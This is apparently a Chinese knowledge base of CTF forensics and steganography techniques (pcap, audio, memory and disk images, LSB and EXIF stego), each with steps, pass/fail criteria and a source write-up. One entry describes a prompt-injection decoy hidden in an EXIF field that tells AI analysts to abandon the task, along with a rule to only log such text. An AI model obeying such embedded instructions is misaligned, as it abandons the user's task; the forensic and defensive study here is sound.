- **裁决词**：待复跑
- **来源**：The Catch 2020 Botnet master｜vernjan｜raw/github-repos/vernjan/write-ups/TheCatch2020/02-malware-research-facility/05-botnet-master/README.md（packets.json 与解析器在 WP 附件）
- **关联**：同「流量→指令语义」族 [[tshark 流量分析]]，关键差异 = push 过滤偏排与双分隔符协议重建。

### pcap 碎片合成 QR（HTTP 对象导出 + ImageMagick）
- **分层**：困难档·复合链
- **假设**：流量里若干小 PNG 各含 flag 棋子图片的局部 ⇒ 导出 HTTP 对象全集，用 convert -append/+append 按位置拼贴出完整棋盘图，其上 QR 码经反色/锐化后可扫描。
- **验证步骤**：1) Wireshark 导出 HTTP objects；2) 观察碎片编号与边缘特征定行列；3) ImageMagick 网格拼接；4) zbarimg 扫描。
- **判定标准**：PASS = QR 解码出旗；FAIL = 碎片顺序不明 → 按 pcap 抓包次序先排。
- **裁决词**：待复跑
- **来源**：CSAW-HSF 2017 qr-200（forensics 200）｜perfect blue（战队）｜raw/github-repos/perfectblue/2017_csaw-hsf_h_qr-200.md（拼贴命令与扫描流程在 WP）
- **关联**：同「碎片重组」族 [[多源碎片雕刻与权威哈希仲裁（NXFR 记录）]] 的低配形态——无哈希权威时以图像连续性定序。

### 音频信道分离 FSK 解调 + XOR 奇偶仲裁（SSTV 目标 CRC）
- **分层**：困难档·复合链
- **假设**：双声道 WAV 左右信道各藏数据（音频 FSK 遥测 + SSTV 图像/权威 CRC 表）⇒ minimodem --rx 解调 FSK 得 NXPKT 分组流；分组声明式 CRC 会放行陈旧重传，须以目标侧权威 CRC 为准筛选，再对缺口分组用 XOR 奇偶组（A⊕D0⊕D1⊕D3 = D2）恢复，最后 GZIP 魔数校验重组。
- **验证步骤**：1) ffmpeg 分离声道；2) minimodem 解调十包遥测；3) 按 len/WIRECRC 过滤 + 对照权威 CRC 拒掉 decoy（NX-770）与陈旧重试；4) 奇偶 XOR 补缺块 → 5757 字节 GZIP 解压取旗。
- **判定标准**：PASS = 重组 GZIP 完整解压出旗；FAIL = 误信用「首个 CRC 合法」重传 → 奇偶组损坏（本条即陷阱记录）。
- **裁决词**：待复跑
- **来源**：CSS CTF 2026 Return of Nexus Ghost Frequency｜hax1ng｜raw/github-repos/hax1ng_css-ctf-2026-return-of-nexus/forensics/ghost-frequency/README.md（reassemble.py 全量在 WP）
- **关联**：与 [[多源碎片雕刻与权威哈希仲裁（NXFR 记录）]] 同一「层级化 CRC 信任」纪律（同一赛事姊妹题）。

### TSPL 打印指令还原（BAR 矩形渲染取旗）
- **分层**：困难档·单点
- **假设**：pcapng 中打印机作业为 TSPL/TSPL2 语言（TSC 打印机指令集）⇒ 提取载荷按 `BAR x,y,w,h` 逐条在画布上画矩形，渲染结果即 flag 位图。
- **验证步骤**：1) 定位含指令流的分组（如 no.675）；2) 识别 TSPL 语法（BAR/TEXT/BITMAP）；3) PIL 按坐标批量绘制；4) 输出 PNG 读旗。
- **判定标准**：PASS = 渲染图可读出 flag；FAIL = 含 BITMAP 光栅段 → 按位解包光栅而非矩形。
- **裁决词**：待复跑
- **来源**：RCTF 2019 printer｜Balsn｜raw/github-repos/balsn/slices/20190518-rctf2019/printer.md（BAR 指令序列全量在 WP，本地渲染可重放）
- **关联**：Q1 边界——按技术实质（工业协议渲染）归 forensics；与 [[tshark 流量分析]] 互补的「协议即图」思路。

### 多源碎片雕刻与权威哈希仲裁（NXFR 记录）
- **分层**：困难档·复合链
- **假设**：同一文件碎片散布三个源（ext4 缓存 blob、已清索引未清记录的环形 spool、被动监听 pcap），均为大端 NXFR 记录（session/sequence/total/len/crc32）⇒ 目录 SQLite 为权威（SHA-256 只对 payload），只有 CRC32 与权威 SHA-256 双验通过的碎片才可信；「CRC 合法但目录哈希不符」的环形残留/重传副本是陷阱。
- **验证步骤**：1) `icat` 提取五类文件（维护说明/格式规范/relay.db/三缓存）；2) 全源扫 NXFR 魔数解析头；3) 对每 (session,seq) 取双验通过副本；4) 按 sequence 拼接、截断到目录声明的总长取旗。
- **判定标准**：PASS = 拼接对象校验通过；FAIL = 采信「先到 CRC 合法」副本 → 重组对象哈希不符（陷阱即反例记录）。
- **裁决词**：待复跑
- **来源**：CSS CTF 2026 Return of Nexus Signal Fracture｜hax1ng｜raw/github-repos/hax1ng_css-ctf-2026-return-of-nexus/forensics/signal-fracture/README.md（recover.py 全量在 WP）
- **关联**：Q1 查重——与 [[音频信道分离 FSK 解调 + XOR 奇偶仲裁（SSTV 目标 CRC）]] 互为姊妹证据（同赛事、同「权威哈希仲裁」纪律、不同载体），支持策略层升格。

### Linux 内存镜像取证（banners 定版 → profile → 进程现场）
- **分层**：困难档·复合链
- **假设**：raw 内存 dump 无法直接读 ⇒ volatility3 `banners.Banners` 扫内核版本串锁定 Ubuntu 内核 5.4.0-84；下载对应 profile 后以 linux.ps/linux.bash/strings 提取进程命令行与现场数据取旗。
- **验证步骤**：1) `vol.py -f dump.mem banners.Banners`；2) 去 volatilityfoundation/profiles 取 Ubuntu18.04(5.4.0-84) profile；3) `linux.ps`/`linux.bash`/`linux.procpid cmdline` 逐层查；4) 命中 flag 格式收束。
- **判定标准**：PASS = banners 唯一定版且 profile 可用并出旗；FAIL = 版本混布（多 banner）→ 按地址聚类取主流内核。
- **裁决词**：待复跑
- **来源**：RITSEC CTF 2023 Missing Piece Part 1（forensics 397p）｜siunam321｜raw/github-repos/siunam321/RITSEC-CTF-2023/Forensics/Missing-Piece-Part-1.md（volatility 命令序列在 WP）
- **陷阱备注**：dump 里多内核 banner 是烟雾——先聚类再挑 profile，盲挂第一个 banner 的 profile 会 plugin 全空。

### acropalypse 截图裁剪漏洞恢复（尾数据 + 尺寸差）
- **分层**：困难档·单点
- **假设**：Pixel 系统截图工具裁剪图片时只把新数据覆盖原文件头部、不截断原长 ⇒ IEND 之后残留未覆盖区，而漏洞恢复只依赖「文件实际长度 − 声明长度」与压缩流尾；老型号（Pixel 3）恢复站点 acropalypse.app 直接解出原图。
- **验证步骤**：1) binwalk/zsteg 探 IEND 后尾数据；2) 计算长度差判断裁剪量；3) 按 Pixel 3 机型在恢复站上传；4) 恢复图读旗。
- **判定标准**：PASS = 恢复出未裁剪原图；FAIL = 声明与实际长度一致（新机已修）→ 转纯尾数据分析路线。
- **裁决词**：待复跑
- **来源**：Hackergame 2023 奶奶的睡前 flag 故事｜USTC-Hackergame（官方+选手，lly）｜raw/github-repos/hackergame2023/2023_hackergame_h_flag_p2.md（漏洞原理分析与机型试错在 WP）
- **关联**：同「PNG 尾数据」族 [[PNG IEND 尾随增量字节提取（逆写入器）]]，关键差异 = 残留由「覆盖不截断」产生，恢复以结构差而非内容拼接。

### ISO→maildir→PGP→outguess 四段链取证
- **分层**：困难档·复合链
- **假设**：ISO 挂载后 grep 线索词定位 maildir 附件 SaintGiong.jpg.pgp（base64 解码后真 PGP）；密钥按指纹在镜像 `etc/mail/private.asc` 内 grep 命中 → gpg 解密得 jpg；隐写口令从正文藏头（首字母）读出 → outguess 提取取旗。
- **验证步骤**：1) mount ISO 后 `grep -ri 线索词 .`；2) base64 -d + gpg --import 私钥 --decrypt；3) 藏头字母拼 passphrase；4) outguess -r 取数据。
- **判定标准**：PASS = 四段全通出旗；FAIL = PGP 解密失败 → 核对 keyid 与私钥指纹一致性。
- **裁决词**：待复跑
- **来源**：WhiteHat 2018 misc02｜p4（波兰战队）｜raw/github-repos/p4/2018_whitehat_h_misc02.md（全程命令在 WP）
- **关联**：Q1 边界——链式取证入口 [[steghide 空口令隐写探测]] 之上，关键差异 = 口令以文本藏头提供而非空口令。

### OLE/Word97 头修复 + foremost 嵌套提取
- **分层**：困难档·复合链
- **假设**：损坏 .doc 实为旧版 Word 二进制（ bjbjj 魔数）⇒ 修复头部后文件内嵌 zip/png；foremost 按签名 carving 出嵌套对象，文本提示「Maybe she will help」指向图片隐写位，解开后双重 base64 得旗。
- **验证步骤**：1) file/xxd 验旧 doc 魔数并修头；2) foremost Fix_me.doc；3) 审 audit.txt 取 zip/png；4) 逐层解包 + 双 base64。
- **判定标准**：PASS = 嵌套对象全提取得旗；FAIL = foremost 误报 → 按偏移手工 dd。
- **裁决词**：待复跑
- **来源**：CheckPoint CSA 2020 Fix me if you can｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2020_fix-me-if-you-can-md_h_fix-me-if-you-can.md（foremost audit 与解码链在 WP）
- **关联**：与 [[zip 伪加密]] 互补的「容器损坏类」首步：先辨格式代际再谈 carving。

### BMP 位平面隐写读取（跟随写入器逻辑）
- **分层**：困难档·复合链
- **假设**：逆向出写入器按「跳过像素/字节 + 位序」规则把 flag 逐位写进 BMP 数据位 ⇒ 不是盲跑 zsteg 滤镜，而是把逆向出的提取参数（步长、起始偏移、位权）转成读取脚本，按位还原。
- **验证步骤**：1) 逆向程序定位写入循环（定位 BMP 像素数组偏移与位操作）；2) 参数化提取脚本；3) 位拼字节按 ASCII 校验；4) 对拍程序逻辑确认无误。
- **判定标准**：PASS = 提取字节为合法 flag 文本；FAIL = 位序反 → LSB/MSB 双向试跑取合法者。
- **裁决词**：待复跑
- **来源**：picoCTF 2019 Investigative Reversing 3｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2019_investigative-reversing-3-md_h_investigative-reversing-3.md（逆向定位与提取思路在 WP）
- **关联**：Q1 边界——技术实质是「逆向定义的隐写格式」；与 [[逆向问答链：strcmp 常量答案 → 常量变换 → RC4 资源口令]] 同为逆向驱动取证。

### hex 文本修复 JPEG + steghide 双层 + morse/ROT13
- **分层**：困难档·复合链
- **假设**：给的是纯十六进制文本而非二进制 ⇒ `xxd -r -p` 还原 JPEG（头部需补 FF D8 段），steghide 以弱口令 123 提出内层图；再提一次得 morse 文本，解码后套 ROT13 得旗。
- **验证步骤**：1) xxd -r -p 重建文件并核对 JPEG 段结构；2) steghide extract -p 123 两层；3) morse 解码表转换；4) ROT13 收束。
- **判定标准**：PASS = 四段全通；FAIL = steghide 报损坏 → 检查 JPEG 头重建是否丢段。
- **裁决词**：待复跑
- **来源**：CultRang 2026 island prison escape（forensics）｜Pranav-m7｜raw/github-repos/Pranav-m7_IIT-Goa-CTF-Writeups-CultRang/forensics/island-prison-escape/README.md（命令序列全量在 WP）
- **关联**：[[steghide 空口令隐写探测]] 的「弱口令猜解」分支；编码层与 [[编码套娃链识别与解链]] 同族（morse→ROT13 双层）。

### 文本空白字符隐写（空格/制表符二进制）
- **分层**：困难档·单点
- **假设**：大段自然语言文本行尾藏空白字符隐写（空格=0、制表符=1）⇒ 正则逐行抽取行尾空白序列转 bit 流，unbits 解码即旗。
- **验证步骤**：1) `cat -A` 或正则 `\t* *$` 检视行尾；2) 每行抽取空白映射 01；3) 拼位流按 8bit 切；4) ASCII 解码校验 flag 格式。
- **判定标准**：PASS = 解码出可读旗；FAIL = 行首/词间空白才是载体 → 移动正则锚点重抽。
- **裁决词**：待复跑
- **来源**：Technion 2020 700k（stego）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2020_700k-md_h_700k.md（solve.py 正则与 unbits 在 WP）
- **陷阱备注**：编辑器默认吞行尾空白——文件必须以二进制方式查看（cat -A / xxd）才不致漏载体。

### E01 取证镜像挂载与删除文件恢复
- **分层**：困难档·复合链
- **假设**：EWF/E01 镜像不可直接挂载 ⇒ ewfmount 转裸设备后 fdisk 读 GPT 分区表，按 `offset=起始扇区×512` 只读挂 NTFS 数据分区；取证目标在 $MFT 残留/回收站/用户目录中恢复。
- **验证步骤**：1) `ewfmount x.E01 dir`；2) `fdisk -l dir/ewf1` 记分区起点；3) `mount -o ro,loop,offset=… show_sysfiles`；4) 审 $MFT/删除项与用户痕迹取旗。
- **判定标准**：PASS = 挂载成功并恢复出目标文件；FAIL = offset 单位错（扇区 vs 字节）→ 统一乘 512 重挂。
- **裁决词**：待复跑
- **来源**：BSidesTLV 2020 Check yourself（forensics 100）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2020_check-yourself-so-you-wont-wreck-yourself-md_h_check-yourself-so-you-wont-wreck-yourself.md（完整命令链在 WP）
- **关联**：同「镜像分层恢复」族 [[ZFS 删除队列与快照恢复（lz4 压缩剥层）]]，关键差异 = 商业取证格式经 ewfmount 转挂而非原生 zfs.ko。

### sqlmap 注入日志轨迹取证（服务端视角拼旗）
- **分层**：困难档·单点
- **假设**：nginx access log 记录了攻击者全程 sqlmap 注入请求 ⇒ urldecode 还原 payload 序列，识别「探测→爆库→逐位爆破」的阶段特征（每位以 != 收尾的盲注判别式），抽出每次命中的字符按序拼旗。
- **验证步骤**：1) 提取注入 URI 序列并 urldecode；2) 定位逐位盲注段（substring+比较+!= 终止）；3) 人工/脚本抽每步判定字符；4) 按请求时序拼接校验。
- **判定标准**：PASS = 拼出完整 flag；FAIL = 日志乱序 → 按时间戳重排再拼。
- **裁决词**：待复跑
- **来源**：RCTF 2015 Analysis nginx's log（MISC 50）｜六星战队（中国）｜raw/github-repos/sixstars/2015_rctf_h_writeup.md（判别式特征描述在 WP）
- **关联**：Q1 边界——[[sqlmap 基线用法]] 是攻击侧工具纪律，本条是防守侧流量取证；「识别自动化工具指纹」是 SOC 视角新知点。

### 音频帧重排恢复（排列指示数组）
- **分层**：困难档·单点
- **假设**：wav 被 0-8349 的一个排列打乱帧序而元信息帧总数为 835000（百倍关系）⇒ strings 在文件尾发现排列数组（字符串形式），按「第 k 帧应放到 A[k] 处」逆置换重排帧后播放即闻旗。
- **验证步骤**：1) strings 审文件尾找数字数组；2) 校验其为 0..N-1 排列；3) numpy 按索引重写帧序；4) 播放/频谱收旗。
- **判定标准**：PASS = 重排后音频可辨识出旗；FAIL = 置换方向反 → 正逆两向取可听者。
- **裁决词**：待复跑
- **来源**：RCTF 2015 I can't hear that（MISC 150）｜六星战队（中国）｜raw/github-repos/sixstars/2015_rctf_h_writeup.md（重排规则在 WP；wave 模块本地可重放）
- **关联**：同「无头媒体重排」族 [[无头视频流分辨率搜索（RGB 字节流重排 + 尾帧取证）]]——关键差异 = 该条搜索几何参数、本条恢复置换映射。

### Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）
- **分层**：困难·单点
- **假设**：正向链为 librosa 三步（melspectrogram→power_to_db→量化 dB 取整）再渲染为 gif 条形图（32 频段×N 帧）；逆向时量化不可逆但只损精度，mel 变换有官方逆函数，可直接「读像素→db_to_power→inverse.mel_to_audio」还原人声。
- **验证步骤**：1) imageio 逐帧读 gif，按 `(像素[:,4k+3]<255).sum()//2` 或红色像素计数还原每帧 dB 列（频率 32×阈值 -60..30 步长 2）；2) `np.array(frames).transpose()` 得 32×N 频谱；3) `librosa.feature.inverse.mel_to_audio(db_to_power(spec), 22050, n_fft=2048, hop_length=512, window='hann')`；4) 归一化写出 wav 人耳听 flag。
- **判定标准**：PASS = 还原音频可辨出逐字拼读的 flag；FAIL = 帧读数轴搞反（pillow 原点在左上，须从 91-y 倒序扫）→ 频谱上下翻转无可读内容。
- **裁决词**：待复跑
- **来源**：Hackergame 2021 p😭q｜xu2r/poscat/Kobe972 三份 WP 同题｜raw/github-repos/hackergame2021/2021_hackergame_h_28-p-q-md.md、_pq-md.md、_readme-md_p19.md（正向代码全量在 WP，参数齐备可本地重放）
- **关联**：与 [[GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）]] 同属「把媒体文件当数据容器逆向渲染管线」思路；音频侧姊妹见 [[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]]。

### 变速语音回声伪影补偿（mpv 慢放参数陷阱）
- **分层**：困难·单点
- **假设**：加速录音直接慢放时，默认播放器的变调补偿（pitch correction）会把拉伸重叠的语音二次合成出回声伪影，导致不可辨；须禁用补偿让减速成为纯时域拉伸。
- **验证步骤**：1) mpv file.mp3 --speed=0.5 --no-audio-pitch-correction（或 mpv.conf 写入该参数）慢放；2) 或用 WavePad 同时调 Pitch 与 Speed 两个滑块保持音色；3) 听写内容为 NATO 音标单词流。
- **判定标准**：PASS = 慢放后逐词可辨且含 leftbracket/rightbracket 占位词；FAIL = 默认 --speed 慢放出现拖影回声（本条陷阱：不查"mpv slow playback echo"而硬听会误判为无信息）。
- **裁决词**：待复跑
- **来源**：Hackergame 2021 去吧！追寻自由的电波｜poscat（WP：raw/github-repos/hackergame2021/2021_hackergame_h_readme-md_p19.md）；另 WavePad 路线见 Kobe972 WP（raw/...readme-md_p24.md）
- **关联**：[[NATO 音标拼读听录（leftbracket 占位词定位括号）]] 为同题姊妹角度。

### NATO 音标拼读听录（leftbracket 占位词定位括号）
- **分层**：困难·单点
- **假设**：flag 以 NATO 音标单词逐字母朗读嵌入语音（foxtrot-lima-alpha-golf…），左/右花括号用 leftbracket/rightbracket 词明示；只需听记单词首字母序列。
- **验证步骤**：1) 减速播放（见姊妹条）；2) 记录单词首字母，leftbracket→{、rightbracket→}；3) 按序拼接。
- **判定标准**：PASS = 拼接串满足 flag 格式；FAIL = 把 tangle（实际为 tango 的听写笔误）等词整词当首字母源→拼写错位。
- **裁决词**：待复跑
- **来源**：Hackergame 2021 去吧！追寻自由的电波｜Kobe972｜raw/github-repos/hackergame2021/2021_hackergame_h_readme-md_p24.md
- **关联**：姊妹条 [[变速语音回声伪影补偿（mpv 慢放参数陷阱）]]；与 [[Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）]] 同为 hackergame 2021 音频隐写双子。

### FPGA 比特流逆向（iCE40 IceStorm 工具链）
- **分层**：困难·多段链
- **假设**：iCE40-HX1K 是最早有全开源逆向工具链的 FPGA；Flash 中 bitstream.bin 可用 iceunpack→icebox_vlog 转回布线级 Verilog，从 LED 与开关的逻辑关系反推「纳秒级正确按键序列」，再用 iverilog 仿真替代真实硬件取串口 flag。
- **验证步骤**：1) Project IceStorm 装 iceunpack/icebox_vlog/icebox_vlog；2) `iceunpack bitstream.bin ascii.asc` + `icebox_vlog -p constraint.pcf ascii.asc > chip.v` 得布线 Verilog；3) 写 testbench 按约束文件枚举四开关时序，iverilog 仿真观察 LED 翻转条件；4) 达成条件后读串口输出。
- **判定标准**：PASS = 仿真中 LED 亮且串口吐 flag；FAIL = 误用商业工具（Vivado/Quartus）或把 bitstream 当固件反汇编。
- **裁决词**：待复跑
- **来源**：Hackergame 2021 外星人的音游掌机｜Peter Gu (regymm)｜raw/github-repos/hackergame2021/2021_hackergame_h_cn-918184.md（WP 300 分，ice40_files.zip 附件含 bitstream+pcf）
- **关联**：硬件侧取证-逆向跨界条；工具链思路与 [[STG-X06 非标准格式先逆生成器——定义在材料里，不在猜里]] 同属「格式逆向→重放」。

### GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）
- **分层**：困难·多段链
- **假设**：40 帧近黑调色板噪声（idx0=#000000/idx1=#010101）中，两帧像素相似度异常（78% vs 基线 50%）即为 XOR 载体对；XOR 结果为缺三个 finder pattern 的 v2 QR（25×25 模块），补画 finder 后可解码；GIF trailer 后另藏 Salted__ blob。
- **验证步骤**：1) Pillow 逐帧转 np 数组，计算两两相似度筛出异常帧对；2) `frame_a ^ frame_b` 得 33×33 布尔阵，截 [4:29,4:29] 定位 QR 数据区；3) 手工补画三个 7×7 finder（同心 3/1 环）；4) padding+kron 放大后 cv2.QRCodeDetector 解出密码；5) 提取 IEND 后 64 字节 blob，`openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:<密码>`。
- **判定标准**：PASS = QR 解出密码且 blob 解密出 flag；FAIL = 不修 finder 直接喂解码器→识别失败（提示 Black isn't always empty）；帧时长三元编码是干扰支线。
- **裁决词**：待复跑
- **来源**：Zero Trace CTF 2026 Lights Out｜DHRUV-MULANI｜raw/github-repos/DHRUV-MULANI_zero-trace-ctf-writeups/Lights_out/lights_out_writeup.md（200 分，帧对 XOR+QR 修复+AES 解密全链代码在 WP）
- **关联**：与 [[PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）]] 同赛事姊妹题（同一"decoy 识别"纪律）。

### 音频声道分工双载隐写（倒放频谱图 + LSB 载荷）
- **分层**：困难·多段链
- **假设**：同一 WAV 的左右声道可分工承载两类隐写：左声道频谱图肉眼化（词语/密码图形）+ 右声道 LSB 位平面对（步长切片）载荷，且频谱图可整段时间倒放（signal[::-1]）伪装成噪声；倒放音频人耳仍像正常信号，须以可懂度为异常指标。
- **验证步骤**：1) wave/scipy 读立体声分离声道；2) 右声道按步长 7 抽 LSB 位平面重组载荷；3) 左声道做频谱图（scipy.signal.spectrogram）→ 图像识别词语；4) 图形内容反常（非字典词）时测试 `signal[::-1]` 重放再 spectrogram；5) 两侧产物拼合（图形密码 + LSB 密文）进入下一层。
- **判定标准**：PASS = 倒放后频谱图可读出词语、LSB 载荷 CRC 校验通过；FAIL = 只扫单声道漏掉分工；倒放遗漏会把图形读成乱序字母（提示 ROTÄESFFDA 类 phonetic 异常）。
- **裁决词**：待复跑
- **来源**：Zero Trace CTF 2026 Whisper Twice｜DHRUV-MULANI｜raw/github-repos/DHRUV-MULANI_zero-trace-ctf-writeups/Whisper_Twice/whisper_twice_writeup.md（250 分，22.05kHz 16bit 立体声，numpy/scipy/wave 工具链全量）
- **关联**：[[时间倒放摩尔斯（整段倒放·符号序反转）]] 为同 WP 独立技术点；decoy 处置纪律见 [[元数据伪旗注释的格式校验防误信]]。

### DNS 间隙 Manchester 信标（查询长度二进制化）
- **分层**：困难·多段链
- **假设**：C2 可将数据编码进 DNS 查询序列的时间/长度特征：相邻查询间隔用 Manchester 编码（短=0/长=1 或双沿规则），主机号顺序给出分块，还原后得下一层入口。
- **验证步骤**：1) tshark 提取 DNS 查询时间戳与域名列表；2) 按间隔阈值二值化（如 <1s=0、≥1s=1）；3) Manchester 解码（01→0/10→1 或按均值规则）；4) 按主机号（.5/.6/.7）排序重组分块。
- **判定标准**：PASS = 解码流与预期协议魔数/长度字段吻合；FAIL = 直接按查询内容（而非时序）找载荷→走入 decoy（.6 主机全为空文件是陷阱）。
- **裁决词**：待复跑
- **来源**：Zero Trace CTF 2026 Whisper Twice｜DHRUV-MULANI｜raw/github-repos/DHRUV-MULANI_zero-trace-ctf-writeups/Whisper_Twice/whisper_twice_writeup.md（Stage 2: Beacon Decoding 段）
- **关联**：时序侧与 [[时间倒放摩尔斯（整段倒放·符号序反转）]] 同属「载体时序即数据」；与 P2 [[TSPL 打印指令还原（BAR 矩形渲染取旗）]] 同为「外设协议承载 C2」家族。

### 列主序 LSB 扫描（Rows lie. Columns don't）
- **分层**：困难·多段链
- **假设**：PNG 载体位平面按「列主序」（先遍历 y 再 x）写入比特，行主序扫描得纯噪声、列主序扫描还原密文；提示语 "Rows lie. Columns don't" 直指扫描顺序。Red 通道 bit1 为常用低幅位。
- **验证步骤**：1) PIL 读像素数组；2) `bits = [pixel[y,x][R] & 1 for y in range(H) for x in range(W)]`（列主序）；3) 按 8 位组包解析出 ZIP 魔数 PK\x03\x04 起始；4) 导出嵌入文件。
- **判定标准**：PASS = 列主序流出现 PK 头/明文；FAIL = 行主序（xy 惯性顺序）→ 随机噪声误判为无载体。
- **裁决词**：待复跑
- **来源**：Zero Trace CTF 2026 Matryoshka Protocol｜DHRUV-MULANI｜raw/github-repos/DHRUV-MULANI_zero-trace-ctf-writeups/Matryoshka_Protocol_Writeup.md（250 分，512×512 RGB，5.4MB）
- **关联**：[[PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）]] 为完整链视角；与 [[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]] 同作者同赛事。

### PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）
- **分层**：困难·多段链
- **假设**：IEND 块后可 append 密码 ZIP 作为第二层载体；ZIP 内 WAV 又双声道分工（左=FSK 1200/2200Hz HDLC 帧、右=倒放摩尔斯），AES 密钥取自摩尔斯词——嵌套结构每层产物恰为下层密钥（套娃协议）。
- **验证步骤**：1) binwalk/字节搜索 IEND 后 PK 签名提取 archive.zip；2) 列主序 LSB 解出 ZIP 密码（见姊妹条）；3) scipy.signal 解调 FSK 得 HDLC 帧（CRC32 0x2DFAF280 校验位精确性验证参数）；4) 右声道 `signal[::-1]` 后摩尔斯解码；5) 拼装密钥解 AES 末层。
- **判定标准**：PASS = 五层全部解锁且末层 flag 满足格式；FAIL = 信用图片内嵌注释 CTF{n1ce_try_but_n0}（decoy）。
- **裁决词**：待复跑
- **来源**：Zero Trace CTF 2026 Matryoshka Protocol｜DHRUV-MULANI｜raw/github-repos/DHRUV-MULANI_zero-trace-ctf-writeups/Matryoshka_Protocol_Writeup.md（完整五层链 + 4 条经验总结在 WP）
- **关联**：母条目链；[[元数据伪旗注释的格式校验防误信]] 为其经验点独立成条。

### 时间倒放摩尔斯（整段倒放·符号序反转）
- **分层**：困难·单点
- **假设**：摩尔斯音频整段时间倒放后人耳仍听为清晰 beep 序列，但每个字符的符号（·/−）与其顺序全部反转，解出的是乱序字母；干净脉冲解出非字典词（如 ROTÄESFFDA）即为倒放信号的特征。
- **验证步骤**：1) 阈值切片得 beep 段序列；2) 直接按 ·/− 解码——若得非字典串，`signal[::-1]` 整段倒放后重新切片解码；3) 字典词校验。
- **判定标准**：PASS = 倒放后解出可读词/密钥；FAIL = 逐字符手动反转而非整段反转（字符间 gap 也反了，符号分组会错位）。
- **裁决词**：待复跑
- **来源**：Zero Trace CTF 2026 Matryoshka Protocol｜DHRUV-MULANI｜raw/github-repos/DHRUV-MULANI_zero-trace-ctf-writeups/Matryoshka_Protocol_Writeup.md（§经验总结第 4 条独立成点）
- **关联**：与 [[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]] 互补；频谱图侧倒放见 [[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]]。

### 元数据伪旗注释的格式校验防误信
- **分层**：困难·单点
- **假设**：出题人常在 PNG tEXt/comment 等元数据埋 CTF{...} 样式伪旗（如 CTF{n1ce_try_but_n0}）诱导正则先中；真旗格式与伪旗不同（HackCTF{...} vs CTF{...}），格式校验是第一道防误信闸。
- **验证步骤**：1) 提取全部疑似 flag 串并记录其来源（元数据/LSB/解密产物）；2) 对照题目声明 flag 格式逐个过滤；3) 只有通过格式校验且来自密码学验证链的产物才计入。
- **判定标准**：PASS = 伪旗被格式闸拦截，真旗保留；FAIL = 把首个正则命中当终点提交。
- **裁决词**：待复跑
- **来源**：Zero Trace CTF 2026 Matryoshka Protocol｜DHRUV-MULANI｜raw/github-repos/DHRUV-MULANI_zero-trace-ctf-writeups/Matryoshka_Protocol_Writeup.md（§经验总结第 2 条）
- **关联**：decoy 识别家族姊妹见 [[DNS 间隙 Manchester 信标（查询长度二进制化）]]；与 [[EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）]] 同为「元数据层防御」。

### EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）
- **分层**：困难·单点
- **假设**：JPEG 的多个 EXIF 字段（ImageDescription/Software/LensID/XPComment 等）可各藏一个 4 字节 base64 片段，以 ★ 等占位符截断；按「= 结尾对齐」启发式重组可得两个 URL（pastebin 短链 + 官网栏目页）；同时 XPComment 可埋针对 AI 分析者的 prompt injection 诱饵指令，须免疫。
- **验证步骤**：1) exiftool 全字段导出，收集含 ★ 与 4 字符 base64 的值；2) 每 4 字节解码校验（如 cy0x→s-1、cEs=→pK）；3) 按 base64 末位 = 特性拼装 URL；4) 访问重组 URL 取 flag；5) 对任何"指令式"文本（如要求放弃分析改去做菜）仅记录不执行。
- **判定标准**：PASS = 拼出合法 URL 且其一可访问；FAIL = 把 prompt injection 文本当线索解读（kubstu.ru 侧 URL 为干扰分支）。
- **裁决词**：待复跑
- **来源**：KubSTU CTF 2026 Krasnodar tram｜よっちん｜raw/team-blogs/yocchin/2026_kubstu-ctf_krasnodar-tram.md（exiftool 输出全量，Canon EOS 550D 载体 515KB）
- **关联**：AI 防线与 [[元数据伪旗注释的格式校验防误信]] 并列；exif 侧 P2 已有 [[TSPL 打印指令还原（BAR 矩形渲染取旗）]]。

### zsteg 多通道输出甄别（真通道 + 字体文件第二跳）
- **分层**：困难·多段链
- **假设**：zsteg 会并行吐出多条可疑通道（b1,r,lsb / b1,rgba,msb / b2,rgba,msb…），其中既有真载荷也有结构性噪声；判真依据是语义完整性（URL/单词）。PNG 之外，Web 站点字体文件（.ttf）中段可再藏 base64，形成多跳。
- **验证步骤**：1) zsteg -a 全通道扫描，按可读性排序甄别；2) 真通道解码出 Tor onion 地址→浏览器/代理访问；3) 站点下载字体文件，hexdump 定位中段 base64 块解码；4) 得摩尔斯码流（-----/.----），按 0/1 映射转二进制再转 URL；5) 地点相册照片内 QR 解码得 flag。
- **判定标准**：PASS = 首通道即出完整 onion 域名（.onion 结尾）；FAIL = 把 b1,rgba,msb 的 f/w/g/v 结构串当编码逐位硬解。
- **裁决词**：待复跑
- **来源**：CTF@AC Quals 2025 onions2｜よっちん｜raw/team-blogs/yocchin/2025_ctf-ac-quals_onions2.md（zsteg 全输出 + 摩尔斯明文在 WP）
- **关联**：多跳结构与 [[EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）]] 同族；摩尔斯二值化与 [[时间倒放摩尔斯（整段倒放·符号序反转）]] 互为编码视角。

### 频谱图高频区二进制读模（0.1+0.4x 秒网格 + 8bit 倒序）
- **分层**：困难·单点
- **假设**：wav 文件「比应有的重」且频谱图高频区出现孤立亮点块，即字符二进制位图；按固定时间网格（0.1+0.4*x 秒）读模，每 8 位一组且组内倒序（LSB-first 绘制），直接拼 ASCII。
- **验证步骤**：1) audacity 打开，频谱图（spectrogram）模式替代频率分析视图；2) 定位高频区亮点，以 0.1s 起点步长 0.4s 读出每字符 8bit；3) 发现每组最高位恒 0（ASCII 特征）→ 组内倒序；4) 拼接出 flag{...}。
